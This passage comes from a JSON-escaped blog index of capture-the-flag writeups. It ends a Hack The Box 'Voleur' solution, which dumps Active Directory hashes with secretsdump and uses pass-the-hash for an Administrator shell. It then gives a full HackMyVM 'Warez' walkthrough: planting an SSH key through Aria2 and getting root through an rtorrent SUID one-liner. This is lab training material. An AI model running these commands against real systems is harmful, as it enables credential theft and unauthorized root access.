\u0026#34;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Registry/SYSTEM\u0026#34; . With these three files locally, we use impacket-secretsdump to extract Active Directory account hashes.\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL Among the results, we obtain the NTLM hash of the Administrator account password, which we use to request a TGT for this user. With this TGT, we can authenticate as Administrator and access their privileges.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-getTGT -hashes :\u0026lt;ADMINISTRATOR_NTLM_HASH\u0026gt; voleur.htb/\u0026#39;Administrator\u0026#39;\rexport KRB5CCNAME=$PWD/Administrator.ccache faketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; evil-winrm -i dc.voleur.htb -r voleur.htb Finally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/voleur/","summary":"Difficulty: Medium 🟠","title":"Voleur - Hack The Box"},{"content":"\rMachine Link\nWhen the machine starts, it displays its IP address; in this case, it is 192.168.18.190.\nThe victim machine's IP address\rTo begin, we will perform a scan using the NMAP tool, which will help us identify open ports on the target machine. First, we will use the following command for a quick scan that informs us about the open ports. We will scan all ports (65535) without depth.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.190 And now, with the open ports identified, we will perform a more detailed scan:\nnmap -sCV -p22,80,6800 -n -Pn 192.168.18.190 -oN target We observe that port 6800 is running Aria2, which is an open-source downloader that supports various protocols such as HTTP, FTP, BitTorrent.\nBy accessing port 80, we obtain the username Carolina.\nUser carolina\rNext, we notice that by selecting \u0026lsquo;By URLs\u0026rsquo; within \u0026lsquo;Add\u0026rsquo;, we can upload files to any directory. So, I am going to copy my id_rsa.pub to a file named authorized_keys and upload it, allowing the victim machine to recognize our machine as authorized, specifically as the user Carolina.\ncp id_rsa.pub authorized_keys If you don\u0026rsquo;t have the id_rsa.pub file, you can create it with the following command:\nssh-keygen And with Python, we start a web server on port 8080:\npython3 -m http.server 8080 Now, we put the URL where our file is located and change the destination directory to /home/carolina/.ssh.\nWe send it, and now we can access via port 22 (SSH) as the user carolina.\nWe are now Carolina\rLet\u0026rsquo;s check how many users are on the machine. It appears that there are only two users: carolina and root.\ngrep /bin/bash /etc/passwd User on the machine\rWe get the user flag, and now it’s time to move on to privilege escalation.\nPrivilege escalation to Root We enumerate the SUID binaries on the machine, and there is one that we can use to escalate to root very easily. The relevant binary is rtorrent.\nWe search in GTFObins, and it provides a way to escalate to root using this SUID binary by running the following command:\nCommand for privilege escalation\recho \u0026#34;execute = /bin/sh,-p,-c,\\\u0026#34;/bin/sh -p \u0026lt;$(tty) \u0026gt;$(tty) 2\u0026gt;$(tty)\\\u0026#34;\u0026#34; \u0026gt;~/.rtorrent.rc /usr/bin/rtorrent We are root\rNow that we have root access, let’s grab the root flag and complete the machine\n","permalink":"http://localhost:1313/writeups/easy/warez/","summary":"Difficulty: Easy 🟢","title":"Warez - HackMyVM"}]